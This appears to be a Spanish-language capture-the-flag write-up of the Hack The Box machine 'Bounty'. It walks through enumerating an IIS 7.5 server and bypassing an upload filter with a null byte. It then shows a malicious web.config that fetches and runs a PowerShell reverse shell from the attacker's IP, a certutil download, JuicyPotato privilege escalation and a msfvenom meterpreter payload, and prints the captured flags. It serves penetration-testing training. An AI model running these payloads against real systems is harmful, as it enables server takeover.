---
tags:
title: Bounty- Easy (HTB)
permalink: /Bounty-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# IntroducciÃ³n

`Bounty` es una mÃ¡quina de dificultad `fÃ¡cil` a media, que cuenta con una tÃ©cnica interesante para `eludir` las protecciones del cargador de archivos y lograr la ejecuciÃ³n de cÃ³digo. Esta mÃ¡quina tambiÃ©n destaca la importancia de mantener los sistemas `actualizados` con los Ãºltimos parches de seguridad.
# Reconocimiento

```bash
nmap -sCV -p80 10.129.252.249                                        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-27 01:42 -03
Nmap scan report for 10.129.252.249
Host is up (0.44s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.19 seconds
```

## Website / Port 80 

En la pagina que corre por el puerto `80` solo muestra una imagen y como puedo ver mediante el plugin `wappalizer` es un `iis` de version `7.5`, sin mas.

![image-center](/assets/images/{6AF41C5E-2B0B-464C-96C8-BD64E06933D9}.png)

### Feroxbuster enumeration

```bash
feroxbuster -u http://bounty.htb/                                                                                                       
                                                                                                                                                                                           
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ðŸ¤“                 ver: 2.13.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ðŸŽ¯  Target Url            â”‚ http://bounty.htb/
 ðŸš©  In-Scope Url          â”‚ bounty.htb
 ðŸš€  Threads               â”‚ 50
 ðŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 ðŸ‘Œ  Status Codes          â”‚ All Status Codes!
 ðŸ’¥  Timeout (secs)        â”‚ 7
 ðŸ¦¡  User-Agent            â”‚ feroxbuster/2.13.0
 ðŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ðŸ”Ž  Extract Links         â”‚ true
 ðŸ  HTTP methods          â”‚ [GET]
 ðŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ðŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      155c http://bounty.htb/aspnet_client => http://bounty.htb/aspnet_client/
200      GET     1624l    16517w  1403476c http://bounty.htb/merlin.jpg
200      GET       32l       53w      630c http://bounty.htb/
301      GET        2l       10w      155c http://bounty.htb/uploadedfiles => http://bounty.htb/uploadedfiles/
301      GET        2l       10w      155c http://bounty.htb/uploadedFiles => http://bounty.htb/uploadedFiles/
301      GET        2l       10w      155c http://bounty.htb/UploadedFiles => http://bounty.htb/UploadedFiles/
301      GET        2l       10w      155c http://bounty.htb/Aspnet_client => http://bounty.htb/Aspnet_client/
301      GET        2l       10w      155c http://bounty.htb/aspnet_Client => http://bounty.htb/aspnet_Client/
301      GET        2l       10w      166c http://bounty.htb/aspnet_client/system_web => http://bounty.htb/aspnet_client/system_web/
301      GET        2l       10w      155c http://bounty.htb/ASPNET_CLIENT => http://bounty.htb/ASPNET_CLIENT/
301      GET        2l       10w      166c http://bounty.htb/Aspnet_client/system_web => http://bounty.htb/Aspnet_client/system_web/
400      GET        6l       26w      324c http://bounty.htb/error%1F_log
400      GET        6l       26w      324c http://bounty.htb/aspnet_client/error%1F_log
400      GET        6l       26w      324c http://bounty.htb/uploadedfiles/error%1F_log
400      GET        6l       26w      324c http://bounty.htb/uploadedFiles/error%1F_log
301      GET        2l       10w      166c http://bounty.htb/aspnet_Client/system_web => http://bounty.htb/aspnet_Client/system_web/
400      GET        6l       26w      324c http://bounty.htb/UploadedFiles/error%1F_log
400      GET        6l       26w      324c http://bounty.htb/Aspnet_client/error%1F_log
301      GET        2l       10w      166c http://bounty.htb/ASPNET_CLIENT/system_web => http://bounty.htb/ASPNET_CLIENT/system_web/
400      GET        6l       26w      324c http://bounty.htb/aspnet_Client/error%1F_log
400      GET        6l       26w      324c http://bounty.htb/aspnet_client/system_web/error%1F_log
400      GET        6l       26w      324c http://bounty.htb/ASPNET_CLIENT/error%1F_log
400      GET        6l       26w      324c http://bounty.htb/Aspnet_client/system_web/error%1F_log
400      GET        6l       26w      324c http://bounty.htb/aspnet_Client/system_web/error%1F_log
400      GET        6l       26w      324c http://bounty.htb/ASPNET_CLIENT/system_web/error%1F_log
[####################] - 8m    360033/360033  0s      found:25      errors:0      
[####################] - 4m     30000/30000   137/s   http://bounty.htb/ 
[####################] - 4m     30000/30000   139/s   http://bounty.htb/aspnet_client/ 
[####################] - 4m     30000/30000   140/s   http://bounty.htb/uploadedfiles/ 
[####################] - 4m     30000/30000   140/s   http://bounty.htb/uploadedFiles/ 
[####################] - 4m     30000/30000   140/s   http://bounty.htb/UploadedFiles/ 
[####################] - 4m     30000/30000   140/s   http://bounty.htb/Aspnet_client/ 
[####################] - 4m     30000/30000   138/s   http://bounty.htb/aspnet_Client/ 
[####################] - 4m     30000/30000   138/s   http://bounty.htb/aspnet_client/system_web/ 
[####################] - 4m     30000/30000   138/s   http://bounty.htb/ASPNET_CLIENT/ 
[####################] - 4m     30000/30000   137/s   http://bounty.htb/Aspnet_client/system_web/ 
[####################] - 4m     30000/30000   139/s   http://bounty.htb/aspnet_Client/system_web/ 
[####################] - 4m     30000/30000   138/s   http://bounty.htb/ASPNET_CLIENT/system_web/ 
```

El `fuzzeo` no revela nada interesante. Ahora realizo la misma para la bÃºsqueda de archivos `asp` o `aspx` por su extensiÃ³n debido a que es un `iis`.

```bash
feroxbuster -u http://bounty.htb/ -x asp,aspx
                                                                                                                                                                                           
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ðŸ¤“                 ver: 2.13.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ðŸŽ¯  Target Url            â”‚ http://bounty.htb/
 ðŸš©  In-Scope Url          â”‚ bounty.htb
 ðŸš€  Threads               â”‚ 50
 ðŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 ðŸ‘Œ  Status Codes          â”‚ All Status Codes!
 ðŸ’¥  Timeout (secs)        â”‚ 7
 ðŸ¦¡  User-Agent            â”‚ feroxbuster/2.13.0
 ðŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ðŸ”Ž  Extract Links         â”‚ true
 ðŸ’²  Extensions            â”‚ [asp, aspx]
 ðŸ  HTTP methods          â”‚ [GET]
 ðŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ðŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET       32l      121w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      155c http://bounty.htb/aspnet_client => http://bounty.htb/aspnet_client/
200      GET     1624l    16517w  1403476c http://bounty.htb/merlin.jpg
200      GET       32l       53w      630c http://bounty.htb/
200      GET       22l       58w      941c http://bounty.htb/transfer.aspx
301      GET        2l       10w      155c http://bounty.htb/uploadedfiles => http://bounty.htb/uploadedfiles/
301      GET        2l       10w      155c http://bounty.htb/uploadedFiles => http://bounty.htb/uploadedFiles/
301      GET        2l       10w      155c http://bounty.htb/UploadedFiles => http://bounty.htb/UploadedFiles/
200      GET       22l       58w      941c http://bounty.htb/Transfer.aspx
301      GET        2l       10w      155c http://bounty.htb/Aspnet_client => http://bounty.htb/Aspnet_client/
404      GET       32l      122w     1528c http://bounty.htb/aspnet_client/Web%20References.aspx
301      GET        2l       10w      155c http://bounty.htb/aspnet_Client => http://bounty.htb/aspnet_Client/
```

La misma busqueda me revela el archivo `Transfer.aspx`.

## Shell as merlin
### Transfer.aspx

La misma pagina presenta una seccion de subida de archivos, y debido a que los archivos q maneja la misma por el hecho de ser un `iis` son archivos con extension `asp`, `aspx`, puedo tratar de subir uno q me envie una revshell a mi maquina.

![image-center](/assets/images/{1DD48E40-5455-454F-BC31-CE4FD79918B5}.png)

El archivo `shell.aspx` su contenido y ejemplo lo saque de este [enlace](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx). Por lo que ahora trato de subirlo

![image-center](/assets/images/{7DA5F4E4-EC20-48A2-A2B3-AD8B460EC6DF}.png)

### Upload bypass

Como me dio error, puede ser que se valide por detrÃ¡s algÃºn tipo de archivo o sanitizaciÃ³n para evitar archivos maliciosos, por lo que ahora puedo interceptar la peticiÃ³n de la subida con  `burpsuite` para ir jugando con `bypasses`.

![image-center](/assets/images/{54787F35-70DC-4049-8DF0-B9EA8A5C631D}.png)

Usando `bypasses` como la doble extensiÃ³n no me funciono pero usando el `null byte` si `(%00)` y ademÃ¡s proporcionÃ¡ndole la extensiÃ³n de una imagen. Pero sin embargo cuando voy a la ruta `/uploadedfiles/shell.aspx` no me carga ni me devuelve una shell sino que me muestra el siguiente error.

![image-center](/assets/images/{337E8E45-D4AC-4F5A-8558-B2EC6322AAFE}.png)

### Web.config 

Generalmente los servicios `ASP` de Windows `(IIS)` usan archivos de configuraciÃ³n como el `Web.config` y existen archivos maliciosos en linea por ejemplo el de este conocido repositorio -> [enlace](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config) de `PayloadAllTheThings`, el que ya directamente crea una interfaz mas linda para poder ejecutar comandos.
Si lo subo y voy a la ruta `uploadedfiles/web.config` veo lo siguiente.

![image-center](/assets/images/{CC67E1A6-A042-4D5B-A94D-002EB8B71E06}.png)

En donde ya puedo ejecutar comando de forma comoda, de todas formas si no hubiera encontrado dicho repositorio puedo jugar con la creacion de objetos con los cuales despues pueda ejecutar comandos, claramente usando `ASP`. De manera que el archivo me quedaria asi.

```asp
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<%
Set obj = CreateObject("WScript.Shell")
obj.Exec("cmd /c powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.17.19/shell.ps1')")
%>
```

Lo que hace este fragmento de cÃ³digo es ejecutar con `cmd` un comando el cual carga en memoria lo que descargue del recurso que se ubica en la `ip` `10.10.17.19` Ã³sea el archivo `shell.ps1` el cual lo renombre asÃ­ para tener un nombre mas cÃ³modo, pero viene siendo el `Invoke-PowerShellTcp.ps1` que se puede descargar de este [enlace](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).
El cual al final del archivo le tuve que agregar la siguiente linea para que me ejecute el comando que quiero haciendo que una vez que el archivo se cargue, lance una Reverse shell a mi maquina.

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.17.19 -Port 4444
```

Ahora vuelvo a repetir los pasos. Subo el archivo `Web.config` y visito la ruta `/uploadedfiles` para hacer que se solicite el archivo `.ps1` que se aloja en mi maquina.

Una vez hago todo veo como desde mi servidor recibo la solicitud de descarga del archivo.

```bash
 python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.252.249 - - [27/Nov/2025 03:00:57] "GET /shell.ps1 HTTP/1.1" 200 -
```

Y desde mi listener `nc` recibo mi shell como `merlin`.

```powershell
nc -nlvp 4444       
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.252.249] 49158
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
bounty\merlin
PS C:\windows\system32\inetsrv>
```

```powershell
PS C:\ProgramData> type ../users/merlin/desktop/user.txt
57af9a6bb04876cd45e1032fbb1af9d1
```

## Shell as system.

### Enumeration

#### SeImpersonatePrivilege 

Una vez desde la shell de `merlin` veo que posee el privilegio `SeImpersonatePrivilege`.

```powershell
PS C:\ProgramData> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

El cual puedo hacer uso la herramienta [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) o [JuicyPotato](https://github.com/k4sth4/Juicy-Potato/tree/main/x64) para poder escalar a `nt authority\system`.

```powershell
PS C:\windows\system32\inetsrv> certutil -urlcache -split -f http://10.10.17.19/JuicyPotato.exe C:\ProgramData\JuicyPotato.exe
****  Online  ****
  0000  ...
  6a00
CertUtil: -URLCache command completed successfully.
```

### Metasploit

Ahora desde una shell aparte voy a crear un `payload` con `msfvenom` .

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.17.19 LPORT=4444 -f exe -o rev.exe        
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: rev.exe
```

TambiÃ©n lo descargo en la maquina y ahora con `msfconsole` configuro el `meterpreter`.

```bash
msfconsole -q                                                                                 
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 10.10.17.19 
lhost => 10.10.17.19
msf exploit(multi/handler) > set lport 4444
lport => 4444
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.17.19:4444
```

Ahora desde la shell de `merlin` solo me queda ejecutar el binario.

```powershell
PS C:\ProgramData> .\JuicyPotato.exe -t * -p rev.exe -l 4444
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4444
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

Y veo como desde mi otra consola recibo el `meterpreter` como `system` de la maquina.

```bash
[*] Sending stage (230982 bytes) to 10.129.252.249
[*] Meterpreter session 1 opened (10.10.17.19:4444 -> 10.129.252.249:49171) at 2025-11-27 03:41:58 -0300

meterpreter > shell
Process 456 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

```powershell
C:\Windows\system32>type ..\..\users\administrator\desktop\root.txt
type ..\..\users\administrator\desktop\root.txt
49f68df1017c23a94ec67ea92bb7ff48
```

`~Happy Hacking.`




